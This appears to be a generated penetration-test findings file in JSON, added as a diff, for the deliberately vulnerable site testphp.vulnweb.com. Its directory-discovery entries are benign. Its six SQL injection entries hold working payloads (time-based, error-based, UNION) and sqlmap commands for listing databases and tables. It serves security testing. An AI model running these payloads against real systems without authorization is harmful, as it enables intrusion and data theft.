@@ -1,0 +1,152 @@
+[
+  {
+    "type": "Directory/File Discovered",
+    "url": "http://testphp.vulnweb.com/",
+    "tool": "ffuf",
+    "severity": "info",
+    "confidence": "high",
+    "evidence": "Status: 200, Size: 4958",
+    "description": "Directory or file discovered during reconnaissance",
+    "detailed_poc": "\n## Directory/File Discovered Proof of Concept\n\n**Vulnerable URL**: http://testphp.vulnweb.com/\n**Tool**: ffuf\n**Evidence**: Status: 200, Size: 4958\n\n### Manual Verification:\n```bash\ncurl \"http://testphp.vulnweb.com/\"\n```\n\n### Impact:\nDirectory or file discovered during reconnaissance\n"
+  },
+  {
+    "type": "Directory/File Discovered",
+    "url": "http://testphp.vulnweb.com/crossdomain.xml",
+    "tool": "ffuf",
+    "severity": "info",
+    "confidence": "high",
+    "evidence": "Status: 200, Size: 224",
+    "description": "Directory or file discovered during reconnaissance",
+    "detailed_poc": "\n## Directory/File Discovered Proof of Concept\n\n**Vulnerable URL**: http://testphp.vulnweb.com/crossdomain.xml\n**Tool**: ffuf\n**Evidence**: Status: 200, Size: 224\n\n### Manual Verification:\n```bash\ncurl \"http://testphp.vulnweb.com/crossdomain.xml\"\n```\n\n### Impact:\nDirectory or file discovered during reconnaissance\n"
+  },
+  {
+    "type": "Directory/File Discovered",
+    "url": "http://testphp.vulnweb.com/CVS",
+    "tool": "ffuf",
+    "severity": "info",
+    "confidence": "high",
+    "evidence": "Status: 301, Size: 169",
+    "description": "Directory or file discovered during reconnaissance",
+    "detailed_poc": "\n## Directory/File Discovered Proof of Concept\n\n**Vulnerable URL**: http://testphp.vulnweb.com/CVS\n**Tool**: ffuf\n**Evidence**: Status: 301, Size: 169\n\n### Manual Verification:\n```bash\ncurl \"http://testphp.vulnweb.com/CVS\"\n```\n\n### Impact:\nDirectory or file discovered during reconnaissance\n"
+  },
+  {
+    "type": "Directory/File Discovered",
+    "url": "http://testphp.vulnweb.com/CVS/Root",
+    "tool": "ffuf",
+    "severity": "info",
+    "confidence": "high",
+    "evidence": "Status: 200, Size: 1",
+    "description": "Directory or file discovered during reconnaissance",
+    "detailed_poc": "\n## Directory/File Discovered Proof of Concept\n\n**Vulnerable URL**: http://testphp.vulnweb.com/CVS/Root\n**Tool**: ffuf\n**Evidence**: Status: 200, Size: 1\n\n### Manual Verification:\n```bash\ncurl \"http://testphp.vulnweb.com/CVS/Root\"\n```\n\n### Impact:\nDirectory or file discovered during reconnaissance\n"
+  },
+  {
+    "type": "Directory/File Discovered",
+    "url": "http://testphp.vulnweb.com/CVS/Repository",
+    "tool": "ffuf",
+    "severity": "info",
+    "confidence": "high",
+    "evidence": "Status: 200, Size: 8",
+    "description": "Directory or file discovered during reconnaissance",
+    "detailed_poc": "\n## Directory/File Discovered Proof of Concept\n\n**Vulnerable URL**: http://testphp.vulnweb.com/CVS/Repository\n**Tool**: ffuf\n**Evidence**: Status: 200, Size: 8\n\n### Manual Verification:\n```bash\ncurl \"http://testphp.vulnweb.com/CVS/Repository\"\n```\n\n### Impact:\nDirectory or file discovered during reconnaissance\n"
+  },
+  {
+    "type": "Directory/File Discovered",
+    "url": "http://testphp.vulnweb.com/CVS/Entries",
+    "tool": "ffuf",
+    "severity": "info",
+    "confidence": "high",
+    "evidence": "Status: 200, Size: 1",
+    "description": "Directory or file discovered during reconnaissance",
+    "detailed_poc": "\n## Directory/File Discovered Proof of Concept\n\n**Vulnerable URL**: http://testphp.vulnweb.com/CVS/Entries\n**Tool**: ffuf\n**Evidence**: Status: 200, Size: 1\n\n### Manual Verification:\n```bash\ncurl \"http://testphp.vulnweb.com/CVS/Entries\"\n```\n\n### Impact:\nDirectory or file discovered during reconnaissance\n"
+  },
+  {
+    "type": "Directory/File Discovered",
+    "url": "http://testphp.vulnweb.com/pictures",
+    "tool": "ffuf",
+    "severity": "info",
+    "confidence": "high",
+    "evidence": "Status: 301, Size: 169",
+    "description": "Directory or file discovered during reconnaissance",
+    "detailed_poc": "\n## Directory/File Discovered Proof of Concept\n\n**Vulnerable URL**: http://testphp.vulnweb.com/pictures\n**Tool**: ffuf\n**Evidence**: Status: 301, Size: 169\n\n### Manual Verification:\n```bash\ncurl \"http://testphp.vulnweb.com/pictures\"\n```\n\n### Impact:\nDirectory or file discovered during reconnaissance\n"
+  },
+  {
+    "type": "Directory/File Discovered",
+    "url": "http://testphp.vulnweb.com/secured",
+    "tool": "ffuf",
+    "severity": "info",
+    "confidence": "high",
+    "evidence": "Status: 301, Size: 169",
+    "description": "Directory or file discovered during reconnaissance",
+    "detailed_poc": "\n## Directory/File Discovered Proof of Concept\n\n**Vulnerable URL**: http://testphp.vulnweb.com/secured\n**Tool**: ffuf\n**Evidence**: Status: 301, Size: 169\n\n### Manual Verification:\n```bash\ncurl \"http://testphp.vulnweb.com/secured\"\n```\n\n### Impact:\nDirectory or file discovered during reconnaissance\n"
+  },
+  {
+    "type": "Directory/File Discovered",
+    "url": "http://testphp.vulnweb.com/vendor",
+    "tool": "ffuf",
+    "severity": "info",
+    "confidence": "high",
+    "evidence": "Status: 301, Size: 169",
+    "description": "Directory or file discovered during reconnaissance",
+    "detailed_poc": "\n## Directory/File Discovered Proof of Concept\n\n**Vulnerable URL**: http://testphp.vulnweb.com/vendor\n**Tool**: ffuf\n**Evidence**: Status: 301, Size: 169\n\n### Manual Verification:\n```bash\ncurl \"http://testphp.vulnweb.com/vendor\"\n```\n\n### Impact:\nDirectory or file discovered during reconnaissance\n"
+  },
+  {
+    "type": "SQL Injection",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=2",
+    "tool": "sqlmap",
+    "severity": "high",
+    "confidence": "high",
+    "evidence": "SQL injection confirmed by sqlmap",
+    "parameter": "cat",
+    "detailed_poc": "\n## SQL Injection Proof of Concept\n\n**Vulnerable URL**: http://testphp.vulnweb.com/listproducts.php?cat=2\n**Vulnerable Parameter**: cat\n**Tool**: sqlmap\n\n\n### Manual Reproduction Steps:\n\n1. **Basic Detection**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/listproducts.php?cat=2'\"\n   ```\n\n2. **Time-Based Blind SQLi**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/listproducts.php?cat=2' AND SLEEP(5)-- -\"\n   ```\n\n3. **Error-Based SQLi**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/listproducts.php?cat=2' AND 1=CAST((SELECT version()) AS INT)-- -\"\n   ```\n\n4. **Union-Based SQLi**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/listproducts.php?cat=2' UNION SELECT 1,2,3,4,5-- -\"\n   ```\n\n### SQLMap Commands for Verification:\n```bash\nsqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=2\" --batch --level=3 --risk=3\nsqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=2\" --batch --dbs\nsqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=2\" --batch -D acuart --tables\n```\n\n### Extracted Payloads:\nNo payloads captured\n\n### Database Information:\n```json\n{}\n```\n\n### Impact:\n* Database enumeration\n* Data extraction\n* Potential system compromise\n* Authentication bypass\n"
+  },
+  {
+    "type": "SQL Injection",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+    "tool": "sqlmap",
+    "severity": "high",
+    "confidence": "high",
+    "evidence": "SQL injection confirmed by sqlmap",
+    "parameter": "cat",
+    "detailed_poc": "\n## SQL Injection Proof of Concept\n\n**Vulnerable URL**: http://testphp.vulnweb.com/listproducts.php?cat=1\n**Vulnerable Parameter**: cat\n**Tool**: sqlmap\n\n\n### Manual Reproduction Steps:\n\n1. **Basic Detection**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/listproducts.php?cat=1'\"\n   ```\n\n2. **Time-Based Blind SQLi**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/listproducts.php?cat=1' AND SLEEP(5)-- -\"\n   ```\n\n3. **Error-Based SQLi**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/listproducts.php?cat=1' AND 1=CAST((SELECT version()) AS INT)-- -\"\n   ```\n\n4. **Union-Based SQLi**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/listproducts.php?cat=1' UNION SELECT 1,2,3,4,5-- -\"\n   ```\n\n### SQLMap Commands for Verification:\n```bash\nsqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=1\" --batch --level=3 --risk=3\nsqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=1\" --batch --dbs\nsqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=1\" --batch -D acuart --tables\n```\n\n### Extracted Payloads:\nNo payloads captured\n\n### Database Information:\n```json\n{}\n```\n\n### Impact:\n* Database enumeration\n* Data extraction\n* Potential system compromise\n* Authentication bypass\n"
+  },
+  {
+    "type": "SQL Injection",
+    "url": "http://testphp.vulnweb.com/artists.php?artist=2",
+    "tool": "sqlmap",
+    "severity": "high",
+    "confidence": "high",
+    "evidence": "SQL injection confirmed by sqlmap",
+    "parameter": "artist",
+    "detailed_poc": "\n## SQL Injection Proof of Concept\n\n**Vulnerable URL**: http://testphp.vulnweb.com/artists.php?artist=2\n**Vulnerable Parameter**: artist\n**Tool**: sqlmap\n\n\n### Manual Reproduction Steps:\n\n1. **Basic Detection**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/artists.php?artist=2'\"\n   ```\n\n2. **Time-Based Blind SQLi**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/artists.php?artist=2' AND SLEEP(5)-- -\"\n   ```\n\n3. **Error-Based SQLi**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/artists.php?artist=2' AND 1=CAST((SELECT version()) AS INT)-- -\"\n   ```\n\n4. **Union-Based SQLi**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/artists.php?artist=2' UNION SELECT 1,2,3,4,5-- -\"\n   ```\n\n### SQLMap Commands for Verification:\n```bash\nsqlmap -u \"http://testphp.vulnweb.com/artists.php?artist=2\" --batch --level=3 --risk=3\nsqlmap -u \"http://testphp.vulnweb.com/artists.php?artist=2\" --batch --dbs\nsqlmap -u \"http://testphp.vulnweb.com/artists.php?artist=2\" --batch -D acuart --tables\n```\n\n### Extracted Payloads:\nNo payloads captured\n\n### Database Information:\n```json\n{}\n```\n\n### Impact:\n* Database enumeration\n* Data extraction\n* Potential system compromise\n* Authentication bypass\n"
+  },
+  {
+    "type": "SQL Injection",
+    "url": "http://testphp.vulnweb.com/artists.php?artist=3",
+    "tool": "sqlmap",
+    "severity": "high",
+    "confidence": "high",
+    "evidence": "SQL injection confirmed by sqlmap",
+    "parameter": "artist",
+    "detailed_poc": "\n## SQL Injection Proof of Concept\n\n**Vulnerable URL**: http://testphp.vulnweb.com/artists.php?artist=3\n**Vulnerable Parameter**: artist\n**Tool**: sqlmap\n\n\n### Manual Reproduction Steps:\n\n1. **Basic Detection**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/artists.php?artist=3'\"\n   ```\n\n2. **Time-Based Blind SQLi**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/artists.php?artist=3' AND SLEEP(5)-- -\"\n   ```\n\n3. **Error-Based SQLi**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/artists.php?artist=3' AND 1=CAST((SELECT version()) AS INT)-- -\"\n   ```\n\n4. **Union-Based SQLi**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/artists.php?artist=3' UNION SELECT 1,2,3,4,5-- -\"\n   ```\n\n### SQLMap Commands for Verification:\n```bash\nsqlmap -u \"http://testphp.vulnweb.com/artists.php?artist=3\" --batch --level=3 --risk=3\nsqlmap -u \"http://testphp.vulnweb.com/artists.php?artist=3\" --batch --dbs\nsqlmap -u \"http://testphp.vulnweb.com/artists.php?artist=3\" --batch -D acuart --tables\n```\n\n### Extracted Payloads:\nNo payloads captured\n\n### Database Information:\n```json\n{}\n```\n\n### Impact:\n* Database enumeration\n* Data extraction\n* Potential system compromise\n* Authentication bypass\n"
+  },
+  {
+    "type": "SQL Injection",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=4",
+    "tool": "sqlmap",
+    "severity": "high",
+    "confidence": "high",
+    "evidence": "SQL injection confirmed by sqlmap",
+    "parameter": "cat",
+    "detailed_poc": "\n## SQL Injection Proof of Concept\n\n**Vulnerable URL**: http://testphp.vulnweb.com/listproducts.php?cat=4\n**Vulnerable Parameter**: cat\n**Tool**: sqlmap\n\n\n### Manual Reproduction Steps:\n\n1. **Basic Detection**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/listproducts.php?cat=4'\"\n   ```\n\n2. **Time-Based Blind SQLi**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/listproducts.php?cat=4' AND SLEEP(5)-- -\"\n   ```\n\n3. **Error-Based SQLi**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/listproducts.php?cat=4' AND 1=CAST((SELECT version()) AS INT)-- -\"\n   ```\n\n4. **Union-Based SQLi**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/listproducts.php?cat=4' UNION SELECT 1,2,3,4,5-- -\"\n   ```\n\n### SQLMap Commands for Verification:\n```bash\nsqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=4\" --batch --level=3 --risk=3\nsqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=4\" --batch --dbs\nsqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=4\" --batch -D acuart --tables\n```\n\n### Extracted Payloads:\nNo payloads captured\n\n### Database Information:\n```json\n{}\n```\n\n### Impact:\n* Database enumeration\n* Data extraction\n* Potential system compromise\n* Authentication bypass\n"
+  },
+  {
+    "type": "SQL Injection",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=3",
+    "tool": "sqlmap",
+    "severity": "high",
+    "confidence": "high",
+    "evidence": "SQL injection confirmed by sqlmap",
+    "parameter": "cat",
+    "detailed_poc": "\n## SQL Injection Proof of Concept\n\n**Vulnerable URL**: http://testphp.vulnweb.com/listproducts.php?cat=3\n**Vulnerable Parameter**: cat\n**Tool**: sqlmap\n\n\n### Manual Reproduction Steps:\n\n1. **Basic Detection**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/listproducts.php?cat=3'\"\n   ```\n\n2. **Time-Based Blind SQLi**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/listproducts.php?cat=3' AND SLEEP(5)-- -\"\n   ```\n\n3. **Error-Based SQLi**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/listproducts.php?cat=3' AND 1=CAST((SELECT version()) AS INT)-- -\"\n   ```\n\n4. **Union-Based SQLi**:\n   ```bash\n   curl \"http://testphp.vulnweb.com/listproducts.php?cat=3' UNION SELECT 1,2,3,4,5-- -\"\n   ```\n\n### SQLMap Commands for Verification:\n```bash\nsqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=3\" --batch --level=3 --risk=3\nsqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=3\" --batch --dbs\nsqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=3\" --batch -D acuart --tables\n```\n\n### Extracted Payloads:\nNo payloads captured\n\n### Database Information:\n```json\n{}\n```\n\n### Impact:\n* Database enumeration\n* Data extraction\n* Potential system compromise\n* Authentication bypass\n"
+  }
+]
